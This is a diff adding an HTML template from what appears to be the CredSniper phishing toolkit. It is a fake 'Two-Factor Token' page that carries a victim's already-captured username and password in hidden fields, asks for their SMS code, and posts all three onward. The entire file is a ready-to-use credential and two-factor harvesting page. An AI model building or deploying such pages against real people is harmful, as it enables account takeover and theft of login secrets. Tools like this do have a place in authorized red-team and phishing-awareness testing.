@@ -1,0 +1,39 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>CredSniper - Example</title>
+    <link href="//netdna.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script type="text/javascript" src="//netdna.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
+</head>
+<body style="">
+<div class="container" style="margin-top:30px">
+<div class="col-md-12">
+    <div class="modal-dialog" style="margin-bottom:0">
+        <div class="modal-content">
+                    <div class="panel-heading">
+                        <h3 class="panel-title">Two-Factor Token</h3>
+                    </div>
+                    <div class="panel-body">
+                        <form role="form" action="{{ next_url }}" method="POST">
+                            <fieldset>
+                                <div class="form-group">
+                                    <input type="hidden" name="username" value="{{ username }}">
+                                    <input type="hidden" name="password" value="{{ password }}">
+                                    <input type="hidden" name="two_factor_type" value="sms">
+                                    <input class="form-control" placeholder="SMS Token" name="two_factor_token" type="text" autofocus="">
+                                </div>
+                                <button type='submit' class="btn btn-sm btn-success">Continue</a>
+                            </fieldset>
+                        </form>
+                    </div>
+                </div>
+    </div>
+</div>
+<hr>
+
+</div>
+
+                            
+                        </body></html>
